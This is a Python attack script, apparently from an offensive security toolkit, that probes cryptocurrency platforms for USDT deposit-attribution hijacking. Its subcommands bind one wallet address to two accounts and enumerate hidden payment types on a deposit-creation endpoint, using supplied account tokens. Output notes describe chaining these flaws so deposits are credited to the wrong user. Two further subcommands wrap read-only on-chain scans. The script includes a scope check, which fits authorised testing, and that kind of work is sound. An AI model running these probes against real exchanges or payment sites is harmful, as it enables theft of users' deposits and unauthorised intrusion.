#!/usr/bin/env python3
"""USDT 充值归属劫持探针：bind-dup / paytype-enum。

对齐 Playbook：传承/马鸿运·归属.md
Skill：杀招/马鸿运·稳币

示例:
  python3 炼蛊房/usdt_attr_hijack.py bind-dup \\
    --base https://授权站 --case <案卷> \\
    --token-a "$A" --token-b "$B" --address T... \\
    --bind-path /api/wallet/usdt/bind

  python3 炼蛊房/usdt_attr_hijack.py paytype-enum \\
    --base https://授权站 --case <案卷> --token "$T" \\
    --create-path /api/deposit/create --visible 1,2,4 --probe 0-16
"""
from __future__ import annotations

import argparse
import json
import ssl
import subprocess
import sys
import urllib.error
import urllib.request
from datetime import datetime, UTC
from pathlib import Path
from typing import Any

OPS = Path(__file__).resolve().parent
ENGINE = (OPS.parent if (OPS.parent / "杀招").is_dir() else (OPS.parent if (OPS.parent / "杀招").is_dir() else OPS.parents[1]))
if str(OPS) not in sys.path:
    sys.path.insert(0, str(OPS))

from scope_lib import host_of, in_scope  # noqa: E402

UA = "Mozilla/5.0 大爱仙尊-usdt_attr_hijack"



def _ssl_ctx():
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    return ctx


def _now() -> str:
    return datetime.now(UTC).strftime("%Y-%m-%dT%H:%M:%SZ")


def case_dir(case: str) -> Path:
    d = ENGINE / "案卷" / case / "测绘" / "usdt_attr"
    d.mkdir(parents=True, exist_ok=True)
    return d


def ensure_scope(url: str) -> None:
    h = host_of(url)
    if h in ("127.0.0.1", "localhost", "::1"):
        return
    if not in_scope(h):
        raise SystemExit(f"[scope] refuse out-of-scope host: {h}")


def _http(
    method: str,
    url: str,
    *,
    token: str | None = None,
    body: dict[str, Any] | None = None,
    extra_headers: dict[str, str] | None = None,
    timeout: float = 30.0,
) -> tuple[int, str, dict[str, str]]:
    data = None
    headers = {"User-Agent": UA, "Accept": "application/json"}
    if token:
        headers["Authorization"] = f"Bearer {token}"
    if extra_headers:
        headers.update(extra_headers)
    if body is not None:
        data = json.dumps(body, ensure_ascii=False).encode("utf-8")
        headers["Content-Type"] = "application/json"
    req = urllib.request.Request(url, data=data, headers=headers, method=method.upper())
    ctx = ssl.create_default_context()
    try:
        with urllib.request.urlopen(req, timeout=timeout, context=ctx) as resp:
            raw = resp.read().decode("utf-8", errors="replace")
            return resp.status, raw, dict(resp.headers.items())
    except urllib.error.HTTPError as e:
        raw = e.read().decode("utf-8", errors="replace")
        return e.code, raw, dict(e.headers.items()) if e.headers else {}


def _parse_probe_range(spec: str) -> list[int]:
    """'0-16' or '1,2,5' or mix '0-3,7,9-11'."""
    out: list[int] = []
    for part in spec.split(","):
        part = part.strip()
        if not part:
            continue
        if "-" in part:
            a, b = part.split("-", 1)
            out.extend(range(int(a), int(b) + 1))
        else:
            out.append(int(part))
    # stable unique
    seen: set[int] = set()
    uniq: list[int] = []
    for x in out:
        if x not in seen:
            seen.add(x)
            uniq.append(x)
    return uniq


def cmd_bind_dup(args: argparse.Namespace) -> int:
    ensure_scope(args.base)
    out = case_dir(args.case)
    base = args.base.rstrip("/")
    path = args.bind_path if args.bind_path.startswith("/") else f"/{args.bind_path}"
    url = f"{base}{path}"
    field = args.bind_field
    payload_extra: dict[str, Any] = {}
    if args.extra_json:
        payload_extra = json.loads(args.extra_json)

    results: list[dict[str, Any]] = []
    for label, token in (("A", args.token_a), ("B", args.token_b)):
        body = {field: args.address, **payload_extra}
        if args.set_default_field:
            body[args.set_default_field] = True
        code, raw, _ = _http(args.method, url, token=token, body=body)
        entry = {
            "account": label,
            "url": url,
            "method": args.method,
            "status": code,
            "body_preview": raw[:800],
            "ok_hint": 200 <= code < 300,
        }
        results.append(entry)
        print(f"[{label}] HTTP {code}  {raw[:200].replace(chr(10), ' ')}")

    a_ok = results[0]["ok_hint"]
    b_ok = results[1]["ok_hint"]
    verdict = {
        "checked_at": _now(),
        "address": args.address,
        "bind_url": url,
        "both_bound_2xx": bool(a_ok and b_ok),
        "l1_no_dedup": bool(a_ok and b_ok),
        "note": (
            "L1: same address accepted by two accounts (no global uniqueness). "
            "L2 still requires controlled on-chain deposit to wrong uid."
            if (a_ok and b_ok)
            else "Second bind failed or first failed — check competition/default override manually."
        ),
        "results": results,
    }
    path_out = out / "bind_dup.json"
    path_out.write_text(json.dumps(verdict, ensure_ascii=False, indent=2) + "\n", encoding="utf-8")
    print(f"[write] {path_out}")
    print(f"[verdict] l1_no_dedup={verdict['l1_no_dedup']}")
    return 0


def cmd_paytype_enum(args: argparse.Namespace) -> int:
    ensure_scope(args.base)
    out = case_dir(args.case)
    base = args.base.rstrip("/")
    path = args.create_path if args.create_path.startswith("/") else f"/{args.create_path}"
    url = f"{base}{path}"
    visible = {int(x) for x in args.visible.split(",") if x.strip() != ""}
    probes = _parse_probe_range(args.probe)
    extra: dict[str, Any] = {}
    if args.extra_json:
        extra = json.loads(args.extra_json)

    rows: list[dict[str, Any]] = []
    for pt in probes:
        body = {args.paytype_field: pt, **extra}
        if args.amount_field and args.amount is not None:
            body[args.amount_field] = args.amount
        code, raw, _ = _http(args.method, url, token=args.token, body=body)
        created = 200 <= code < 300
        # crude: treat clear business reject keywords as not-created
        low = raw.lower()
        reject_kw = ("支付方式错误", "未开启", "not enable", "invalid pay", "paytype", "不支持")
        soft_reject = any(k.lower() in low if k.isascii() else k in raw for k in reject_kw)
        row = {
            "paytype": pt,
            "visible_ui": pt in visible,
            "status": code,
            "created_hint": created and not soft_reject,
            "hidden_accepted": (pt not in visible) and created and not soft_reject,
            "body_preview": raw[:500],
        }
        rows.append(row)
        flag = "HIDDEN_OK" if row["hidden_accepted"] else ("OK" if row["created_hint"] else "NO")
        print(f"[paytype={pt}] HTTP {code}  {flag}  {raw[:120].replace(chr(10), ' ')}")

    hidden = [r["paytype"] for r in rows if r["hidden_accepted"]]
    report = {
        "checked_at": _now(),
        "create_url": url,
        "visible": sorted(visible),
        "probe": probes,
        "hidden_accepted": hidden,
        "p1_attack_surface": bool(hidden),
        "note": (
            "P1: server accepts paytypes not in frontend visible set. "
            "Alone may not credit balance; combine with attribution chain."
        ),
        "rows": rows,
    }
    path_out = out / "paytype_enum.json"
    path_out.write_text(json.dumps(report, ensure_ascii=False, indent=2) + "\n", encoding="utf-8")
    print(f"[write] {path_out}")
    print(f"[verdict] hidden_accepted={hidden}")
    return 0


def cmd_chain_scan(args: argparse.Namespace) -> int:
    script = ENGINE / "tools" / "stdlib-kit" / "chain_scan.py"
    if not script.is_file():
        raise SystemExit(f"missing {script}")
    out = case_dir(args.case)
    cmd = [
        sys.executable, str(script),
        "--pages", str(args.pages),
        "--min-approve", str(args.min_approve),
    ]
    r = subprocess.run(cmd, capture_output=True, text=True, timeout=180, check=False)
    raw = (r.stdout or "") + ("\n" + r.stderr if r.stderr else "")
    (out / "chain_scan.txt").write_text(raw, encoding="utf-8")
    report = {
        "checked_at": _now(),
        "cmd": cmd,
        "rc": r.returncode,
        "out": str(out / "chain_scan.txt"),
        "note": "只读链上 Approval；候选再 chain-verify。禁止当全网扫站。",
    }
    (out / "chain_scan.json").write_text(
        json.dumps(report, ensure_ascii=False, indent=2) + "\n", encoding="utf-8"
    )
    print(raw)
    print(f"[write] {out / 'chain_scan.json'}")
    return int(r.returncode)


def cmd_chain_verify(args: argparse.Namespace) -> int:
    script = ENGINE / "tools" / "stdlib-kit" / "chain_verify.py"
    if not script.is_file():
        raise SystemExit(f"missing {script}")
    out = case_dir(args.case)
    cmd = [sys.executable, str(script)]
    if args.file:
        cmd.extend(["-f", args.file, "--json"])
    elif args.address:
        cmd.append(args.address)
    else:
        raise SystemExit("需要 --address 或 --file")
    r = subprocess.run(cmd, capture_output=True, text=True, timeout=180, check=False)
    raw = (r.stdout or "") + ("\n" + r.stderr if r.stderr else "")
    (out / "chain_verify.txt").write_text(raw, encoding="utf-8")
    print(raw)
    print(f"[write] {out / 'chain_verify.txt'}")
    return int(r.returncode)


def build_parser() -> argparse.ArgumentParser:
    p = argparse.ArgumentParser(description="USDT deposit attribution hijack probes")
    sub = p.add_subparsers(dest="cmd", required=True)

    b = sub.add_parser("bind-dup", help="Bind same address on two accounts")
    b.add_argument("--base", required=True)
    b.add_argument("--case", required=True)
    b.add_argument("--token-a", required=True)
    b.add_argument("--token-b", required=True)
    b.add_argument("--address", required=True, help="Self-controlled test wallet only")
    b.add_argument("--bind-path", required=True)
    b.add_argument("--bind-field", default="address")
    b.add_argument("--set-default-field", default="", help="e.g. isDefault / default")
    b.add_argument("--method", default="POST")
    b.add_argument("--extra-json", default="", help='Extra JSON object merged into body')
    b.set_defaults(func=cmd_bind_dup)

    e = sub.add_parser("paytype-enum", help="Enumerate paytype vs frontend visible set")
    e.add_argument("--base", required=True)
    e.add_argument("--case", required=True)
    e.add_argument("--token", required=True)
    e.add_argument("--create-path", required=True)
    e.add_argument("--paytype-field", default="paytype")
    e.add_argument("--amount-field", default="amount")
    e.add_argument("--amount", type=float, default=1.0)
    e.add_argument("--visible", default="1,2,4", help="Frontend-visible paytypes")
    e.add_argument("--probe", default="0-16", help="Range/list to probe")
    e.add_argument("--method", default="POST")
    e.add_argument("--extra-json", default="")
    e.set_defaults(func=cmd_paytype_enum)

    cs = sub.add_parser("chain-scan", help="USDT TRC20 approve 资金入口拓线（只读）")
    cs.add_argument("--case", required=True)
    cs.add_argument("--pages", type=int, default=25)
    cs.add_argument("--min-approve", type=int, default=3)
    cs.set_defaults(func=cmd_chain_scan)

    cv = sub.add_parser("chain-verify", help="候选地址二次判别（只读）")
    cv.add_argument("--case", required=True)
    cv.add_argument("--address", default="")
    cv.add_argument("--file", default="")
    cv.set_defaults(func=cmd_chain_verify)

    return p


def main() -> int:
    parser = build_parser()
    args = parser.parse_args()
    return int(args.func(args))


if __name__ == "__main__":
    raise SystemExit(main())
